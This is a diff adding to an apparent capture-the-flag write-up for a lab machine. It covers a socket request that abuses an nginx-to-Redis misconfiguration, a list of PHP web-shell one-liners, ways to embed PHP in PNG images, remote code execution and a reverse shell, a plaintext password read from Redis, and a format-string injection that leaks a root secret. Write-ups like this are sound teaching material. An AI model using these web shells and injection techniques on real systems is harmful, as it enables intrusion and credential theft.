@@ -506,8 +506,7 @@ def brush_like_a_pro():
     """Get an oral-B toothbrush from Redis"""
     uds = 'unix:/var/run/redis/redis.sock'
     payload = f'HSET /static/{uds}:{USER}%20pro%20true%20/{USER} HTTP/1.1\r\n'\
-              f'Host: {DOMAIN}'\
-              '\r\n'\
+              f'Host: {DOMAIN}\r\n'\
               '\r\n'.encode()
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((DOMAIN, 80))
@@ -535,3 +534,255 @@ python3 micro.py blnkn
 ![ham.png](ham.png)  
 
 Yea boy... I'm a pro
+
+
+## Abusing the upload feature to get a PHP shell
+
+Grab some popcorn 🍿🍿  
+[https://github.com/samayo/bulletproof](https://github.com/samayo/bulletproof/issues/90)  
+
+In depth explanation of how to reverse png compression filters to embed php in IDAT  
+[encoding-web-shells-in-png-idat](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)  
+
+This article is also really good an gives a great of all the different ways to embed php in images:  
+[https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there](https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)  
+
+In french but also great content:
+[https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)  
+
+Notes of some php things I could do
+```php
+<?php phpinfo();?>
+<?php exec($_GET['cmd']);?>
+<?php system($_GET['cmd']);?>
+<?php shell_exec($_GET['cmd']);?>
+<?php $_GET[0]($_POST[1]);?>
+<?=$_GET[0]($_POST[1]);?>
+```
+Note `<?=` is a shortcut for `<?php echo`  
+
+I spent a bunch of time trying to include a php shell embeded in an image, as described in the links above:   
+- png with php appended to the end of it -> caught
+- png with php in exif data -> not caught
+- png with php in idat -> not caught
+
+The extension of the uploaded things are still png though, so they need to be included somehow  
+I think it is probably possible, but I just didn't manage to make it work.  
+I'm sure if it is possible ippsec will show us the way in a few month.  
+
+That beeing said, once we have pro, we have write access to `/var/www/microblog/blnkn/uploads/` so we can use the same nginx misconfig we used to change the key in redis to write to the filesystem 
+![info-burp.png](info-burp.png)  
+
+Then just visit the upload path and we got RCE
+![info.png](info.png)  
+
+Same concept with a reverse shell, and we get a callback as www-data
+![rev-burp.png](rev-burp.png)  
+
+
+## Privesc from www-data to cooper
+
+Cooper reused his unix password in his app, and since it is stored in plaintext in the redis hash, it's easy to get.
+```bash
+redis-cli -s /var/run/redis/redis.sock
+
+KEYS *
+blnkn:sites
+PHPREDIS_SESSION:t3g3i4m9j6a46dmv2hdaca9n07
+blogger:sites
+teo:sites
+blogger
+blnkn
+cooper.dooper:sites
+cooper.dooper
+PHPREDIS_SESSION:6liutn3vgsftefhr0cjaqg40m0
+teo
+PHPREDIS_SESSION:tdhboofshr26rv81b7l6ji03dl
+PHPREDIS_SESSION:nvmksha2oelt998m8vie9uka9e
+PHPREDIS_SESSION:u5d6m7fs5lhvqa2aumlrol8etm
+PHPREDIS_SESSION:oiadmngoa4uehic7u6h0bei8a5
+
+HKEYS cooper.dooper
+username
+password
+first-name
+last-name
+pro
+
+HGET cooper.dooper password
+zooperdoopercooper
+```
+
+## Privesc from cooper to root
+
+Cooper can execute the pro licence provisioning script as root
+```bash
+cooper@format:~$ sudo -l
+[sudo] password for cooper:
+Sorry, try again.
+[sudo] password for cooper:
+Matching Defaults entries for cooper on format:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cooper may run the following commands on format:
+    (root) /usr/bin/license
+```
+
+It works like that:
+```
+cooper@format:~$ sudo /usr/bin/license -p blnkn
+
+Plaintext license key:
+------------------------------------------------------
+microblogblnkn.HO[Vh.t4=]hEo~U-q}z_E_0M5TcSfPa;7_dV2zZblnknblnkn
+
+Encrypted license key (distribute to customer):
+------------------------------------------------------
+gAAAAABkaNcxKqkvhqKsyP2hBWdnDVxkP-T1YxUWust-6UEzL0HToC0q_iYv1cJcEuZHAOqZsC0_dxtC_yhrZpUKPuokCLqCONHVFtd6QZVHOgEPId8MDybhl-XrVs-SV_uvlZsgw5MixGNuxnQ90QAuRM6g_7k11bljq_idNuD2VPxkL794qWo=
+```
+
+```bash
+cooper@format:/usr/bin$ sudo /usr/bin/license -c 'gAAAAABkaNcxKqkvhqKsyP2hBWdnDVxkP-T1YxUWust-6UEzL0HToC0q_iYv1cJcEuZHAOqZsC0_dxtC_yhrZpUKPuokCLqCONHVFtd6QZVHOgEPId8MDybhl-XrVs-SV_uvlZsgw5MixGNuxnQ90QAuRM6g_7k11bljq_idNuD2VPxkL794qWo='
+
+License key valid! Decrypted value:
+------------------------------------------------------
+microblogblnkn.HO[Vh.t4=]hEo~U-q}z_E_0M5TcSfPa;7_dV2zZblnknblnkn
+```
+
+It's fair to assume that what we're after is the `secret_encoded` variable which is reading from `/root/license/secret`   
+Technically it's the secret used to encode the license keys, but we know cooper is a password reuse ninja so... It's worth a shot.  
+```python
+#!/usr/bin/python3
+
+import base64
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.fernet import Fernet
+import random
+import string
+from datetime import date
+import redis
+import argparse
+import os
+import sys
+
+class License():
+    def __init__(self):
+        chars = string.ascii_letters + string.digits + string.punctuation
+        self.license = ''.join(random.choice(chars) for i in range(40))
+        self.created = date.today()
+
+if os.geteuid() != 0:
+    print("")
+    print("Microblog license key manager can only be run as root")
+    print("")
+    sys.exit()
+
+parser = argparse.ArgumentParser(description='Microblog license key manager')
+group = parser.add_mutually_exclusive_group(required=True)
+group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
+group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
+group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
+args = parser.parse_args()
+
+r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')
+
+secret = [line.strip() for line in open("/root/license/secret")][0]
+secret_encoded = secret.encode()
+salt = b'microblogsalt123'
+kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
+encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))
+
+f = Fernet(encryption_key)
+l = License()
+
+#provision
+if(args.provision):
+    user_profile = r.hgetall(args.provision)
+    if not user_profile:
+        print("")
+        print("User does not exist. Please provide valid username.")
+        print("")
+        sys.exit()
+    existing_keys = open("/root/license/keys", "r")
+    all_keys = existing_keys.readlines()
+    for user_key in all_keys:
+        if(user_key.split(":")[0] == args.provision):
+            print("")
+            print("License key has already been provisioned for this user")
+            print("")
+            sys.exit()
+    prefix = "microblog"
+    username = r.hget(args.provision, "username").decode()
+    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
+    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
+    print("")
+    print("Plaintext license key:")
+    print("------------------------------------------------------")
+    print(license_key)
+    print("")
+    license_key_encoded = license_key.encode()
+    license_key_encrypted = f.encrypt(license_key_encoded)
+    print("Encrypted license key (distribute to customer):")
+    print("------------------------------------------------------")
+    print(license_key_encrypted.decode())
+    print("")
+    with open("/root/license/keys", "a") as license_keys_file:
+        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")
+
+#deprovision
+if(args.deprovision):
+    print("")
+    print("License key deprovisioning coming soon")
+    print("")
+    sys.exit()
+
+#check
+if(args.check):
+    print("")
+    try:
+        license_key_decrypted = f.decrypt(args.check.encode())
+        print("License key valid! Decrypted value:")
+        print("------------------------------------------------------")
+        print(license_key_decrypted.decode())
+    except:
+        print("License key invalid")
+    print("")
+
+```
+
+We control the keys from redis and they are used in a format string that is then printed to us, so we can use any of this keys in redis with curly braces to print the content of the variable we're after.    
+```bash
+redis /var/run/redis/redis.sock> HMSET blnkn first-name "{license.__init__.__globals__[secret_encoded]}" last-name blnkn password blnkn username blnkn
+OK
+redis /var/run/redis/redis.sock> HGET blnkn first-name
+"{license.__init__.__globals__[secret_encoded]}"
+redis /var/run/redis/redis.sock> HKEYS blnkn
+1) "first-name"
+2) "last-name"
+3) "password"
+4) "username"
+redis /var/run/redis/redis.sock>
+```
+
+We get the secret back instead of our first-name 
+```bash
+cooper@format:~$ sudo /usr/bin/license -p blnkn
+
+Plaintext license key:
+------------------------------------------------------
+microblogblnknn-v?H\48Qe~q"A{TZ*{>/2nGf@DL&UY;{|G;~6K&b'unCR4ckaBL3Pa$$w0rd'blnkn
+
+Encrypted license key (distribute to customer):
+------------------------------------------------------
+gAAAAABkaNx5eFFJOyYg6iEvxZqDlj4JOK3Vd05j2aEm1t0eLlNvwV10Od7nqUOi0m5L0fcqQgULOgmg3MGeBZ95XZwE_OxdNBPNg7YV7-k0al4m3VSSsl2o6-mVEQ5EjdGLE72Ej8sk39ugOcYK_B_v2SRfY6YDrL-5CcBSFhI5WH4CA0MPFV0gBbyB4aHxClDu6gdXbISk
+```
+
+And as predicted is is the password for root
+```bash
+cooper@format:~$ su -
+Password:
+root@format:~# 
+```
